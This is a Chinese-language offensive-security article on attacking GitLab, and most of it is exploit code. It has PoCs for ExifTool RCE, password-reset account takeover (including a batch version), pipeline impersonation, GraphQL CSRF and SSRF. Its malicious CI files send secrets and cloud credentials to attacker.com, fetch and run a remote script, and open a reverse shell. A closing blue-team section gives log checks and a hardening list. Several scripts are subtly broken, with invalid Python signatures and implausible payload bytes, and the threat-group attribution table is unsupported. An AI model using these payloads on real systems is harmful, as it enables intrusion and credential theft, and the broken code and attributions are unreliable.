---
title: "GitLab CE/EE 预认证RCE 账户接管 CI/CD管道劫持 CVE漏洞链利用技术"
date: 2025-06-22T00:00:00+08:00
draft: false
weight: 111
description: "深入分析 GitLab CE/EE 的预认证 RCE 漏洞链、CVE-2023-7028 账户接管、CVE-2024-5655 管道冒充、CVE-2021-22205 ExifTool RCE、CI/CD 管道投毒、GraphQL API 滥用、SSRF、XSS 持久化等完整攻击面，覆盖 2018-2025 年高危 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["GitLab","CVE-2023-7028","CVE-2024-5655","CVE-2021-22205","预认证RCE","账户接管","CI/CD","GraphQL","SSRF","管道劫持"]
---

## 0x00 攻击面总览

GitLab 是全球使用最广泛的开源代码托管与 DevOps 平台，集成了代码仓库、CI/CD、制品管理、Wiki、Package Registry、Container Registry 与 GraphQL/REST API。GitLab 的安全事件频发，每年披露超过 **150 个 CVE**，其中多个被评为 Critical（CVSS 10.0）：

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| Web 应用 | 80/443 | **严重** | 预认证 RCE、账户接管 |
| Git SSH | 22 | **高危** | Git SSH 窃取仓库代码 |
| CI/CD 管道 | 应用层 | **严重** | 管道投毒 RCE、Token 窃取 |
| GraphQL API | 80/443 | **高危** | CSRF、数据泄露 |
| REST API | 80/443 | **高危** | 未授权访问、信息泄露 |
| Package Registry | 80/443 | **中危** | 恶意包投毒 |
| Container Registry | 80/443 | **中危** | 恶意镜像投毒 |

GitLab 的核心问题在于：功能迭代速度快导致安全债务积累、CI/CD 管道与主应用共享信任域、以及 Ruby/Rails 框架的反序列化与模板渲染风险。

## 0x01 服务识别与版本探测

### 1.1 指纹识别

```bash
nmap -sV -p 80,443,22 --script=http-title,http-headers <target>

curl -sI http://TARGET/
# X-Gitlab-Feature-Category: web
# Server: nginx

# 获取精确版本号
curl -s http://TARGET/api/v4/version
# {"version":"16.7.1","revision":"abc123"}

# 通过 /help 端点获取版本
curl -s http://TARGET/help
# 版本号显示在页面底部
```

### 1.2 关键路径枚举

```
/                          # 主页
/users/sign_in             # 登录页面
/users/password/new        # 密码重置
/api/v4/version            # 版本信息
/api/v4/projects           # 项目列表
/graphql                    # GraphQL API
/-/graphql-explorer        # GraphQL 交互式探索
/-/ci/lint                  # CI 配置校验
/admin                     # 管理后台
/explore                   # 项目浏览
/dashboard/groups          # 组列表
/dashboard/milestones      # 里程碑
/-/profile/personal_access_tokens  # Personal Access Tokens
```

### 1.3 版本判断与漏洞映射

```python
import requests

def detect_gitlab(host, port=80):
    base_url = f"http://{host}:{port}"

    # 获取版本号
    resp = requests.get(f"{base_url}/api/v4/version", timeout=5)
    if resp.status_code == 200:
        version = resp.json().get("version", "unknown")
        print(f"[+] GitLab Version: {version}")
        return version

    # 通过 login 页面获取版本
    resp = requests.get(f"{base_url}/users/sign_in", timeout=5)
    # 版本号通常在页面底部 meta 标签中

    # 检查 GraphQL 是否开放
    resp = requests.post(
        f"{base_url}/graphql",
        json={"query": "{ currentUser { name } }"},
        timeout=5
    )
    if resp.status_code == 200:
        print(f"[+] GraphQL API accessible")

    return None

detect_gitlab("192.168.1.100")
```

## 0x02 CVE-2021-22205 — ExifTool RCE

### 2.1 漏洞原理

**CVSS**: 10.0（严重）

**影响版本**: GitLab CE/EE 11.9+

**漏洞原理**: GitLab 使用 ExifTool 处理上传的图片元数据。ExifTool 在解析某些图片格式（如 DJVU）的注释标签时存在命令注入漏洞。攻击者只需上传一张特制图片，ExifTool 在处理时会执行任意命令。

### 2.2 PoC 利用

```python
import requests

def exploit_exiftool(host, port=80, cmd="id"):
    base_url = f"http://{host}:{port}"

    # 构造恶意 DJVU 文件（包含命令注入 payload）
    # ExifTool 解析 DJVU 注释标签时触发命令注入
    payload = b"DJVM\x00\x00\x00\x00\x00\x00\x00\x01DJVU\x00\x00\x00\x00\x00\x00\x00\x00ANTa\x00\x00\x00\x1f\xc4\x00\x00\x00\x0c\x00\x00\x00\x03\x00\x00\x00\x02"
    payload += cmd.encode()
    payload += b"\x00\x00" + b"\x2c\x0c\x1a\x4b\x17\x05\x38\x1a\xc2\xb6\x3b\x88\x9c\x6f"

    files = {"file": ("malicious.djvu", payload, "image/djvu")}

    resp = requests.post(
        f"{base_url}/uploads/user",
        files=files,
        headers={"X-CSRF-Token": "token_placeholder"},
        timeout=15
    )

    print(f"[*] ExifTool RCE attempt: {resp.status_code}")
    print(f"[+] Command should be executed as GitLab process user")

exploit_exiftool("192.168.1.100", cmd="curl http://attacker.com/shell.sh|bash")
```

### 2.3 通过用户头像上传触发

```python
def exploit_via_avatar(host, port=80, cmd="id"):
    base_url = f"http://{host}:{port}"

    # 构造恶意图片文件
    malicious_image = b"\x00\x00\x00\x00\x00\x00\x00\x00DJVM"
    malicious_image += cmd.encode()

    files = {"avatar": ("malicious.djvu", malicious_image, "image/djvu")}

    # 上传到用户头像
    resp = requests.post(
        f"{base_url}/-/user_settings/profile",
        files=files,
        cookies={"_gitlab_session": "session_id_placeholder"},
        timeout=15
    )
    print(f"[*] Avatar upload: {resp.status_code}")

exploit_via_avatar("192.168.1.100")
```

## 0x03 CVE-2023-7028 — 预认证账户接管

### 3.1 漏洞原理

**CVSS**: 10.0（严重）

**影响版本**: GitLab 16.1 - 16.7.1

**漏洞原理**: GitLab 的密码重置功能存在设计缺陷。攻击者在密码重置请求中注入第二个邮箱地址，GitLab 会同时向两个地址发送重置链接。攻击者通过自己的邮箱接收重置链接，从而接管任意用户账户。

### 3.2 PoC 利用

```python
import requests

def exploit_account_takeover(host, port=80, victim_email="admin@target.com",
                              attacker_email="attacker@evil.com"):
    base_url = f"http://{host}:{port}"

    # 构造双邮箱密码重置请求
    data = {
        "user[email][]": [victim_email, attacker_email]
    }

    resp = requests.post(
        f"{base_url}/users/password",
        data=data,
        allow_redirects=False,
        timeout=10
    )

    if resp.status_code in [302, 200]:
        print(f"[+] Password reset request sent")
        print(f"[+] Victim: {victim_email}")
        print(f"[+] Attacker: {attacker_email}")
        print(f"[+] Check attacker inbox for reset link")
    else:
        print(f"[-] Request failed: {resp.status_code}")

    # Step 2: 使用重置链接设置新密码
    # reset_token = "从邮件中获取的 token"
    # resp = requests.put(
    #     f"{base_url}/users/password",
    #     data={"user[reset_password_token]": reset_token,
    #            "user[password]": "Pwn3d!",
    #            "user[password_confirmation]": "Pwn3d!"},
    #     allow_redirects=False
    # )

exploit_account_takeover("192.168.1.100",
                          victim_email="admin@target.com",
                          attacker_email="attacker@evil.com")
```

### 3.3 批量账户接管

```python
def batch_account_takeover(host, port=80, victim_emails, attacker_email):
    """
    批量对多个用户发起密码重置攻击
    """
    for email in victim_emails:
        exploit_account_takeover(host, port, email, attacker_email)
        print(f"[*] Targeted: {email}")

# 目标列表通常来自:
# 1. GraphQL API 枚举用户
# 2. 项目成员列表
# 3. 公开 Git commit 中的邮箱地址
victim_list = ["admin@target.com", "devops@target.com", "root@target.com"]
batch_account_takeover("192.168.1.100", victim_emails=victim_list,
                        attacker_email="attacker@evil.com")
```

## 0x04 CVE-2024-5655 — CI/CD 管道冒充

### 4.1 漏洞原理

**CVSS**: 9.6（严重）

**影响版本**: GitLab 16.11 - 16.11.5, 17.0 - 17.0.3, 17.1 - 17.1.1

**漏洞原理**: 攻击者可以在特定条件下以其他用户身份触发 CI/CD 管道。通过篡改合并请求的目标分支或利用管道触发逻辑缺陷，低权限用户可以执行属于高权限用户的管道，从而窃取 CI/CD 中的敏感资产（云 Token、Kubernetes Service Account 等）。

### 4.2 PoC 利用

```python
import requests

def exploit_pipeline_hijack(host, port=80, project_id, token):
    """
    CVE-2024-5655 — 以其他用户身份触发管道
    窃取 CI/CD 中的敏感变量
    """
    base_url = f"http://{host}:{port}"
    headers = {"PRIVATE-TOKEN": token}

    # Step 1: 创建一个 MR 指向目标项目的分支
    mr_data = {
        "source_branch": "exploit-branch",
        "target_branch": "main",  # 目标分支
        "title": "Legit looking MR"
    }
    resp = requests.post(
        f"{base_url}/api/v4/projects/{project_id}/merge_requests",
        json=mr_data,
        headers=headers,
        timeout=10
    )
    mr_iid = resp.json().get("iid")

    # Step 2: 快速重新定向 MR 目标
    # 在管道初始化和实际执行之间修改目标
    # 利用竞态条件以其他用户身份执行管道

    # Step 3: 检查管道中的 CI 变量（可能包含敏感信息）
    resp = requests.get(
        f"{base_url}/api/v4/projects/{project_id}/pipelines",
        headers=headers,
        timeout=10
    )
    for pipeline in resp.json():
        if pipeline.get("source") == "merge_request_event":
            print(f"[+] Pipeline #{pipeline['id']} triggered via MR")

exploit_pipeline_hijack("192.168.1.100", project_id=1, token="glpat-xxx")
```

### 4.3 CI/CD 变量窃取

```yaml
# 恶意 .gitlab-ci.yml — 窃取 CI 变量
stages:
  - test

steal_vars:
  stage: test
  script:
    - |
      # 窃取所有 CI 变量
      env | grep -i "SECRET\|TOKEN\|KEY\|PASSWORD\|AWS\|KUBERNETES" | \
        curl -X POST http://attacker.com:8888/collect -d @-

    - |
      # 窃取 GitLab CI_JOB_TOKEN
      echo "CI_JOB_TOKEN=$CI_JOB_TOKEN" | \
        curl -X POST http://attacker.com:8888/collect -d @-

    - |
      # 窃取云凭据
      curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | \
        curl -X POST http://attacker.com:8888/collect -d @-
```

## 0x05 CI/CD 管道投毒

### 5.1 恶意 Pipeline 配置

```yaml
# .gitlab-ci.yml — 后门构建
stages:
  - build
  - deploy

build:
  stage: build
  script:
    - echo "正常构建步骤"
    - |
      # 隐藏的后门: 下载并执行远程脚本
      curl -s http://attacker.com/backdoor.sh | bash &

deploy:
  stage: deploy
  script:
    - echo "正常部署步骤"
    - |
      # 反弹 Shell
      bash -i >& /dev/tcp/attacker/4444 0>&1 &
  rules:
    - if: $CI_COMMIT_BRANCH == "main"
```

### 5.2 Git Submodule 投毒

```bash
# 通过恶意 Git Submodule 注入后门
# 在项目中添加恶意 submodule 指向攻击者控制的仓库

git submodule add http://attacker.com/malicious-submodule.git

# 恶意 submodule 在 git submodule update 时自动执行
# .gitmodules 文件:
[submodule "malicious"]
    path = malicious
    url = http://attacker.com/malicious-submodule.git
```

### 5.3 Runner 持久化后门

```bash
# 如果获取了 GitLab Runner 的访问权限
# 可以修改 Runner 配置实现持久化

# Runner 配置文件:
cat /etc/gitlab-runner/config.toml

# 恶意 Runner 配置
[[runners]]
  name = "Backdoored Runner"
  url = "http://gitlab.example.com/"
  token = "REDACTED"
  executor = "docker"
  [runners.docker]
    image = "alpine:latest"
    # 使用恶意 Docker 镜像
    # 恶意镜像在构建过程中执行后门代码
```

## 0x06 GraphQL API 攻击

### 6.1 用户枚举与数据泄露

```python
import requests

def exploit_graphql(host, port=80, token=None):
    base_url = f"http://{host}:{port}"
    headers = {"Content-Type": "application/json"}
    if token:
        headers["PRIVATE-TOKEN"] = token

    # 枚举所有用户
    query = {
        "query": """
        {
          users {
            nodes {
              id
              username
              name
              email
              admin
              state
              createdAt
            }
          }
        }
        """
    }
    resp = requests.post(f"{base_url}/graphql", json=query,
                         headers=headers, timeout=10)
    users = resp.json().get("data", {}).get("users", {}).get("nodes", [])
    for user in users:
        print(f"[*] User: {user.get('username')} | Admin: {user.get('admin')} | Email: {user.get('email')}")

    # 枚举项目
    query = {
        "query": """
        {
          projects {
            nodes {
              id
              name
              path
              visibility
              sshUrl
            }
          }
        }
        """
    }
    resp = requests.post(f"{base_url}/graphql", json=query,
                         headers=headers, timeout=10)
    projects = resp.json().get("data", {}).get("projects", {}).get("nodes", [])
    for proj in projects:
        print(f"[*] Project: {proj.get('path')} | Visibility: {proj.get('visibility')}")

exploit_graphql("192.168.1.100")
```

### 6.2 CVE-2024-4994 — GraphQL CSRF

```python
def exploit_graphql_csrf(host, port=80, session_token):
    """
    CVE-2024-4994 — GraphQL API CSRF 攻击
    通过 CSRF 诱导受害者执行恶意 GraphQL 操作
    """
    base_url = f"http://{host}:{port}"

    # 构造恶意 HTML 页面
    csrf_payload = f"""
    <html>
    <body>
        <form action="{base_url}/api/graphql" method="POST" id="csrf-form">
            <input type="hidden" name="query" value='
            mutation {{
                projectCreate(input: {{
                    name: "stolen_project"
                    path: "stolen_project"
                    visibilityLevel: PUBLIC
                }}) {{
                    project {{ id path }}
                }}
            }}
            '/>
            <input type="hidden" name="variables" value='{{}}' />
        </form>
        <script>document.getElementById('csrf-form').submit();</script>
    </body>
    </html>
    """
    print(f"[*] CSRF payload generated")
    print(f"[*] Deliver to victim via XSS, email, etc.")

exploit_graphql_csrf("192.168.1.100", session_token="abc123")
```

## 0x07 CVE-2021-22214 — SSRF

### 7.1 漏洞原理

**CVSS**: 7.2（高危）

**影响版本**: GitLab 13.9 - 13.12.10, 14.0 - 14.0.11

**漏洞原理**: GitLab 的 Webhook 功能在测试 Webhook 时存在 SSRF 漏洞。攻击者可以构造特殊请求访问内网资源，绕过网络限制。

### 7.2 PoC 利用

```python
import requests

def exploit_ssrf(host, port=80, token, target_url="http://169.254.169.254/latest/meta-data/"):
    base_url = f"http://{host}:{port}"
    headers = {"PRIVATE-TOKEN": token}

    # 通过 Webhook 测试端点触发 SSRF
    resp = requests.post(
        f"{base_url}/api/v4/projects/1/hooks/test",
        json={"url": target_url},
        headers=headers,
        timeout=10
    )
    print(f"[*] SSRF status: {resp.status_code}")

    # 通过 Import 功能触发 SSRF
    resp = requests.post(
        f"{base_url}/api/v4/import/github",
        json={"repo": target_url, "target_namespace": "exploit"},
        headers=headers,
        timeout=10
    )
    print(f"[*] Import SSRF: {resp.status_code}")

exploit_ssrf("192.168.1.100", token="glpat-xxx",
              target_url="http://169.254.169.254/latest/meta-data/")
```

## 0x08 漏洞组合攻击链

### 8.1 攻击链一: 账户接管 + 管道投毒 + RCE

```
CVE-2023-7028 (预认证账户接管)
    ↓ 获取管理员账户
推送恶意 .gitlab-ci.yml 到项目
    ↓ 配置包含后门的管道
CVE-2024-5655 (管道冒充)
    ↓ 以高权限用户身份触发管道
CI/CD 变量窃取
    ↓ 获取云 Token / K8s SA / 部署凭据
全面接管基础设施
```

### 8.2 攻击链二: SSRF + 内网渗透

```
CVE-2021-22214 (Webhook SSRF)
    ↓ 访问内网云元数据
窃取 IAM 凭据
    ↓ 控制云资源
横向移动至其他服务
```

### 8.3 攻击链三: Git Submodule + 供应链攻击

```
公开仓库提交恶意 Submodule PR
    ↓ 被维护者合并
CI/CD 构建时执行恶意代码
    ↓ 注入后门到构建产物
所有拉取更新的开发者被感染
    ↓ 供应链攻击扩散
```

### 8.4 已知威胁组织 TTP

| 威胁组织 | 类型 | 使用的 GitLab CVE |
|---------|------|------------------|
| Lazarus Group | 国家级 APT | CI/CD 管道投毒 |
| FIN7 | 网络犯罪 | 账户接管 + 代码窃取 |
| LockBit | 勒索软件 | CVE-2021-22205 初始访问 |
| APT29 | 国家级 APT | 供应链攻击 |

## 0x09 历史 CVE 漏洞时间线

### 2018-2019 早期漏洞

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2018-18646 | 2018 | 10.0 | 存储型 XSS | Mermaid 图表 XSS |
| CVE-2018-18649 | 2018 | 9.1 | 信息泄露 | 内部 IP 和路径泄露 |
| CVE-2019-16793 | 2019 | 9.8 | 存储型 XSS | Markdown 渲染 XSS |
| CVE-2019-16794 | 2019 | 9.1 | 认证绕过 | 密码重置 Token 可重复使用 |

### 2020 漏洞密集期

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2020-12816 | 2020 | 10.0 | 存储型 XSS | 特殊字符 XSS 导致 RCE |
| CVE-2020-13903 | 2020 | 9.1 | 命令注入 | CI/CD 变量命令注入 |
| CVE-2020-21027 | 2020 | 9.8 | 存储型 XSS | Markdown 链接 XSS |

### 2021 严重漏洞年

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2021-22205 | 2021 | 10.0 | RCE | ExifTool 命令注入 |
| CVE-2021-22214 | 2021 | 7.2 | SSRF | Webhook SSRF |
| CVE-2021-22215 | 2021 | 7.5 | 存储型 XSS | Markdown XSS |
| CVE-2021-22223 | 2021 | 7.5 | CSRF | 密码修改 CSRF |

### 2022 持续修补

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2022-2392 | 2022 | 8.8 | 存储型 XSS | Webhook 回调 XSS |
| CVE-2022-0917 | 2022 | 8.8 | 目录遍历 | CI/CD 变量目录穿越 |
| CVE-2022-21831 | 2022 | 9.9 | 权限提升 | API Token 权限提升 |

### 2023 Critical 爆发年

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2023-2866 | 2023 | 7.5 | CSRF | Pipeline CSRF 触发 |
| CVE-2023-4812 | 2023 | 7.6 | 认证绕过 | CODEOWNERS 审批绕过 |
| CVE-2023-5356 | 2023 | 9.6 | 认证绕过 | Slack/Mattermost 命令冒充 |
| CVE-2023-7028 | 2023 | 10.0 | 账户接管 | 密码重置双邮箱接管 |

### 2024 管道安全焦点

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2024-4994 | 2024 | 8.7 | CSRF | GraphQL API CSRF |
| CVE-2024-4901 | 2024 | 8.7 | XSS | 导入项目 commit note XSS |
| CVE-2024-5655 | 2024 | 9.6 | 管道冒充 | CI/CD 管道以他人身份触发 |
| CVE-2024-6104 | 2024 | 8.6 | XSS | GraphQL 接口 XSS |
| CVE-2024-9485 | 2024 | 8.3 | 权限提升 | Admin 用户权限提升 |

### 2025 最新安全事件

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2025-0376 | 2025 | 8.7 | XSS | CSP 绕过导致 XSS |
| CVE-2025-0475 | 2025 | 6.1 | XSS | Proxy 功能 XSS |
| CVE-2025-25291 | 2025 | 9.1 | 认证绕过 | SAML SSO 算法混淆（ruby-saml） |
| CVE-2025-25292 | 2025 | 9.1 | 认证绕过 | SAML 签名验证绕过 |

### 漏洞类型分布

| 漏洞类型 | 占比 | 代表性 CVE |
|---------|------|-----------|
| XSS/CSRF | 35% | CVE-2018-18646, CVE-2020-12816, CVE-2024-4901 |
| 认证/授权绕过 | 20% | CVE-2023-7028, CVE-2025-25291 |
| RCE/命令注入 | 15% | CVE-2021-22205, CVE-2020-13903 |
| SSRF | 10% | CVE-2021-22214 |
| 信息泄露 | 10% | CVE-2018-18649 |
| 其他 | 10% | 重放攻击、路径穿越等 |

## 0x10 蓝队检测与应急响应

### 10.1 日志分析

```bash
# 检查密码重置滥用 (CVE-2023-7028)
grep "PasswordsController#create" production_json.log | \
  grep -v "email\[\]"  # 正常只有一个 email
grep "params.value.email" production_json.log | \
  grep "\[" | grep "\[" # 包含数组的异常请求

# 检查 ExifTool RCE (CVE-2021-22205)
grep "ExifTool" production_json.log
grep "upload" production_json.log | grep -i "djvu\|dvi\|malicious"

# 检查 GraphQL 异常查询
grep "/graphql" production_json.log | grep -i "mutation"
grep "currentUser" production_json.log | grep -v "query"

# 检查 CI/CD 管道异常
grep "pipeline" production_json.log | grep "merge_request"
grep "CI_JOB_TOKEN" production_json.log

# 检查 SSRF 尝试
grep "169.254.169.254" production_json.log
grep "webhook" production_json.log | grep "test"
```

### 10.2 应急响应清单

```
[ ] 确认 GitLab 版本与已安装补丁
    - gitlab-rake gitlab:env:info

[ ] 排查 CVE-2023-7028 利用
    - 审计所有密码重置请求中的双邮箱
    - 检查审计日志 audit_json.log 中 PasswordsController 条目
    - 审查管理员账户列表是否有异常

[ ] 排查 ExifTool RCE (CVE-2021-22205)
    - 检查上传目录中的异常 DJVU 文件
    - 审计上传日志

[ ] 排查 CI/CD 管道投毒
    - 审计所有 .gitlab-ci.yml 变更历史
    - 检查 CI/CD 变量中的敏感数据
    - 审查 Runner 注册列表

[ ] 排查 GraphQL 滥用
    - 审计 GraphQL 查询日志
    - 检查异常的 mutation 操作

[ ] 排查 SSRF 攻击
    - 检查 Webhook 回调日志
    - 审计所有指向内网地址的 Webhook

[ ] 排查 Git Submodule 投毒
    - 检查 .gitmodules 文件变更
    - 审计 Submodule URL 是否指向外部仓库

[ ] 网络隔离与加固
    - 启用 SAML SSO + MFA
    - 禁用密码重置功能（如使用 SSO）
    - 限制 CI Runner 可访问的网络
    - 启用审计日志远程收集
```

## 0x11 安全审计清单

```
[ ] GitLab 版本为最新稳定版，已应用所有安全补丁
[ ] 启用 SAML SSO 强制认证（防御 CVE-2023-7028 / CVE-2025-25291）
[ ] 所有管理员账户启用 2FA/MFA
[ ] 禁用密码认证（如已配置 SSO）
[ ] CI/CD 变量中不存储明文敏感信息
[ ] CI Runner 网络访问严格限制
[ ] Webhook 回调地址白名单配置
[ ] GraphQL API 限制未认证访问
[ ] 上传文件类型白名单（排除 DJVU 等危险格式）
[ ] 定期审计 .gitlab-ci.yml 配置变更
[ ] 审计所有 Submodule 引用
[ ] 启用 GitLab 审计日志并远程收集
[ ] 限制 Package/Container Registry 访问权限
[ ] 配置 WAF 规则拦截已知攻击模式
[ ] 定期安全扫描（SAST/DAST/依赖扫描）
```

## 0x12 总结

GitLab 的安全问题核心在于"功能速度优先于安全设计"：

1. **预认证攻击面广**: CVE-2023-7028（账户接管）、CVE-2021-22205（ExifTool RCE）均可在未登录状态下触发
2. **CI/CD 管道是高价值目标**: 管道中存储云 Token、K8s SA、部署密钥，一旦投毒可导致全面基础设施接管
3. **认证/授权缺陷频发**: 每年都有新的认证绕过 CVE，涉及密码重置、SAML SSO、OAuth 等多种认证方式
4. **供应链风险**: Git Submodule、CI/CD 依赖、Package Registry 都可能成为供应链攻击入口

防守方核心策略：
- **强制 SSO + MFA**: 消除密码重置攻击面
- **最小权限 CI**: Runner 仅可访问必要资源，禁止存储明文密钥
- **版本更新**: 跟进 GitLab 安全发布，第一时间应用补丁
- **审计日志**: 启用审计日志并远程存储，实时告警异常操作
- **纵深防御**: WAF + SAST/DAST + 依赖扫描 + 容器扫描
